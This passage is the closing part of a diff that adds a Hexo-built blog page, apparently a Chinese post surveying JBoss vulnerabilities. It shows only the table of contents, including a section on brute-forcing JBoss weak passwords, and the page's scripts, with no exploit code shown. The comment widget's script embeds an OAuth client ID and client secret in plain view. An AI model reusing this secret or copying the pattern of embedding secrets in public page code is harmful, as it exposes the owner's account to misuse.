href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-8"><span class="toc-nav-number">2.9.5.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#JBoss-gt-7-x%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%8F%8A%E7%88%86%E7%A0%B4"><span class="toc-nav-number">2.10.</span> <span class="toc-nav-text">JBoss &gt;7.x弱口令及爆破</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-9"><span class="toc-nav-number">2.10.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">2.10.2.</span> <span class="toc-nav-text">漏洞范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-9"><span class="toc-nav-number">2.10.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-8"><span class="toc-nav-number">2.10.4.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-9"><span class="toc-nav-number">2.10.5.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">总结</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">参考</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2020/07/05/Jboss漏洞汇总/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Jboss漏洞汇总",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
